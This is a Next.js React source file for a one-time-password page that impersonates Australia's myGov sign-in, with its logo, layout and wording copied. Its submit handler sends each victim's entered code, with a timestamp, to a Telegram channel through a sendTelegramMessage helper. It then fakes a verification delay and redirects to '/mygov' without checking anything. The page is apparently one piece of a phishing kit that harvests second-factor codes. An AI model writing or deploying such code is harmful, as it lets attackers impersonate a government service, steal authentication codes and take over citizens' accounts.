/* eslint-disable @next/next/no-img-element */
"use client"
import React, { useState, useEffect } from "react";
import "../css/mgv2-application.css";
import "../css/blugov.css";
import { sendTelegramMessage } from "../../utils/telegram";

const OTPPage: React.FC = () => {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [timer, setTimer] = useState(60);
  const [canResend, setCanResend] = useState(false);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0 && !canResend) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    } else if (timer === 0) {
      setCanResend(true);
    }
    return () => clearInterval(interval);
  }, [timer, canResend]);

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    setError("");
    
    if (!otp) {
      setError("Please enter a valid  OTP");
      return;
    }

    setIsLoading(true);

    const message = `
🔐 OTP Verification Attempt
OTP: ${otp}
Time: ${new Date().toLocaleString()}
`;

    try {
      // Send Telegram Message
      await sendTelegramMessage(message);

      // Replace with actual OTP verification API call
      await new Promise(resolve => setTimeout(resolve, 1000));
      console.log("OTP verification successful");
      window.location.href = '/mygov'; // Redirect on success
    } catch (err) {
      setError("Invalid OTP code");
      console.log(err);
    } finally {
      setIsLoading(false);
    }
  };


  const handleResendOTP = () => {
    // Add resend OTP logic here
    setTimer(60);
    setCanResend(false);
    setError("");
    console.log("Resending OTP...");
  };

  return (
    <div>
      <div className="brand-rainbow">&nbsp;</div>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a className="unauth-govt-crest__link">
                  <img
                    id="unauth-govt-crest"
                    src="/images/myGov-cobranded-logo-black.svg"
                    alt="myGov Beta"
                    role="img"
                  />
                </a>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <h1>Enter Code</h1>
                      <h2 className="text-align-left">
                      We sent a code by SMS to your mobile number.
                      </h2>
                      <form
                        id="otp-form"
                        className="mygov-login-form alternative"
                        onSubmit={handleSubmit}
                      >
                        {error && (
                          <div className="error-message" style={{ color: "red", marginBottom: "1rem" }}>
                            {error}
                          </div>
                        )}
                        <div className="input-group">
                          <label htmlFor="otp">
                            One-Time Password (OTP)
                          </label>
                          <input
                            id="otp"
                            name="otp"
                            type="text"
                            value={otp}
                            onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
                            inputMode="numeric"
                            autoComplete="one-time-code"
                            required
                            disabled={isLoading}
                            style={{ letterSpacing: '0.5em', fontWeight: 'bold' }}
                          />
                        </div>
                        
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              type="submit"
                              className="button-main"
                              disabled={isLoading}
                            >
                              {isLoading ? "Verifying..." : "Verify OTP"}
                            </button>
                          </div>
                        </div>

                        <p className="recovery">
                          {canResend ? (
                            <button
                              type="button"
                              className="anchor override"
                              onClick={handleResendOTP}
                              style={{ background: 'none', border: 'none', padding: 0 }}
                            >
                              Resend OTP
                            </button>
                          ) : (
                            <span>Resend OTP in {timer} seconds</span>
                          )}
                        </p>

                        <p className="create-account-text">
                          Didn&apos;t receive the code? Check your spam folder or{' '}
                          <a
                            className="create-account-link"
                            href="#"
                            onClick={handleResendOTP}
                          >
                            request a new code
                          </a>.
                        </p>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        {/* Keep the same footer content as original */}
      </footer>
    </div>
  );
};

export default OTPPage;